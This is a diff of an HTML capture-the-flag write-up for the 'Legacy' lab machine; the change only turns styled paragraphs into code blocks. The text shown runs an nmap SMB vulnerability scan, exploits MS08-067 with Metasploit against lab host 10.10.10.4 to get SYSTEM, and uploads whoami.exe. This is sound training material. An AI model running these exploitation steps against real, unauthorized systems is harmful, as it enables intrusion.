@@ -61,7 +61,9 @@
      <h2>2. Nmap's NSE (Further enum)</h2>
      
      
-        <p>I tried testing smb first, using a guest account to see if it has a password. Next up I honed in on the ports with an nmap script: <p class="writeup-strong">(nmap -script smb-vuln -p 139,445 10.10.10.4)</p><p>Running this Nmap scan looking for issues with SMB resulted in a finding for ms08-067:</p>
+        <p>I tried testing smb first, using a guest account to see if it has a password. Next up I honed in on the ports with an nmap script: <pre><b>nmap -script smb-vuln -p 139,445 10.10.10.4)</b></pre>
+        
+        <p>Running this Nmap scan looking for issues with SMB resulted in a finding for ms08-067:</p>
         
         
         <img src="legacy/3.png" height=500 width=750 alt="legacy">
@@ -69,27 +71,27 @@
     
     <p>I decided to go with the MS08-067 exploit and opened it up in metasploit:</p>
         
-    <p class="writeup-strong">Search MS08-067
+    <pre><b>Search MS08-067
 
     Use 0
 
     Set RHOSTS 10.10.10.4
 
-    Run</p>
+    Run</b></pre>
         
         
     <p>So now, I was running as SYSTEM but I couldn’t run various commands e.g whoami.
 So I decided to upload it from my local machine:</p>
         
         
-    <p class="writeup-strong">si@kali:~$ locate whoami.exe
+    <pre><b>si@kali:~$ locate whoami.exe
 
-    /usr/share/windows-resources/binaries/whoami.exe</p>
+    /usr/share/windows-resources/binaries/whoami.exe</b></pre>
         
     
     <p>I ran the following command:</p>
         
-    <p class="writeup-strong">Upload /usr/share/windows-resources/binaries/whoami.exe</p>
+        <pre><b>Upload /usr/share/windows-resources/binaries/whoami.exe</b></pre>
      
     <p>I could now run the command(s) I wanted. And next up, was reading the flag:</p>
         
